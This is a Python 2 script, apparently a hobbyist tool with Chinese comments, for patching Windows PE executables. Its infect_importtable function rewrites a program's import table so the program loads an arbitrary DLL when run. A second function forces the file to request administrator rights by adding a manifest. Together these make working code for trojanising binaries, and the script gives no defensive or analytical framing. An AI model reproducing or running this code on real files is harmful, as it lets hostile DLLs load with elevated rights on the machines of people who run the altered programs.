#coding:utf-8

import pefile
from struct import *
import sys
import os
import shutil
from win32api import *

def align4(address):
	return ((address / 4)+1)*4 if address % 4 else address
	
def OF2RVA(of_address, PE):
	for section in PE.sections:
		if of_address >= section.PointerToRawData and of_address <= section.PointerToRawData+section.SizeOfRawData:
			delta = section.VirtualAddress  - section.PointerToRawData
			return delta+of_address
	return 0

def RVA2OF(rva_address, PE):
	for section in PE.sections:
		if rva_address >= section.VirtualAddress and rva_address <= section.VirtualAddress+section.SizeOfRawData:
			delta = section.VirtualAddress  - section.PointerToRawData
			return rva_address-delta
	return 0

def EnableUAC(path):
	UAC_MAINFEST = '''<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"></requestedExecutionLevel>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>'''

	hUpdate = BeginUpdateResource(path,False)
	if not hUpdate:
		return False
	UpdateResource(hUpdate,24,1,UAC_MAINFEST)
	EndUpdateResource(hUpdate,False)
	return True
	pass
	
def infect_importtable(path,dllname,ordinal=1):
	if not os.path.exists(path):
		return False
	try: 
		pe = pefile.PE(path)
	except pefile.PEFormatError:
		return False
	
	image_import_address = pe.OPTIONAL_HEADER.DATA_DIRECTORY[1].VirtualAddress
	image_import_size = pe.OPTIONAL_HEADER.DATA_DIRECTORY[1].Size
	print "VirtualAddress,Size :",hex(image_import_address),hex(image_import_size)
	spec_section = 0
	for section in pe.sections:
		# print "section name is :",section.Name
		if section.SizeOfRawData - section.Misc_VirtualSize > image_import_size + 0x20:
			spec_section = section
			break
	
	if spec_section:
		new_offset = align4(spec_section.PointerToRawData+spec_section.Misc_VirtualSize)
		stuff_thunk = pack('15sIIII',dllname,0x80000000+ordinal,0,0x80000000+ordinal,0)  #填充一个地方存放我们的dllname 跟一些 后面需要引用到的变量
		new_image_import_desc = pack('IIIII',OF2RVA(new_offset+0x18,pe),0,0,OF2RVA(new_offset,pe),OF2RVA(new_offset+0x10,pe)) #填充一个IMAGE_IMPORT_DESCRIPTOR结构 增加一个DLL的引用
		new_iat =  pe.get_memory_mapped_image()[image_import_address:image_import_address+image_import_size-0x14]+new_image_import_desc
		file_offset_iat = pe.OPTIONAL_HEADER.DATA_DIRECTORY[1].get_field_absolute_offset('VirtualAddress')
		#print repr(new_iat)
		#print hex(image_import_address)
		#print hex(image_import_size)
		#print repr(pe.get_memory_mapped_image()[image_import_address:image_import_address+image_import_size])
		out_file = open(path,'rb+')
		out_file.seek(new_offset)
		out_file.write(stuff_thunk)
		# 填充一些数据到file中
		out_file.seek(new_offset+0x20)
		out_file.write(new_iat)
		# 填充新构建好的IAT
		out_file.seek(file_offset_iat)
		out_file.write(pack('I',OF2RVA(new_offset+0x20,pe)))
		# 修改IAT的virtual的地址
		out_file.seek(file_offset_iat+4)
		out_file.write(pack('I',image_import_size+0x14))
		# 修改IAT的地址
		out_file.seek(spec_section.get_field_absolute_offset("Characteristics"))
		out_file.write(pack('I',spec_section.Characteristics | 0x80000000))
		out_file.flush()
		out_file.close()
		return True
	return False
def main():
	# print infect_importtable("c:\\python27\\scripts\\LordPE.EXE","DrvDll.dll",2)
	EnableUAC("c:\\python27\\scripts\\LordPE.EXE")
	pass
	
if __name__ == '__main__':
	main()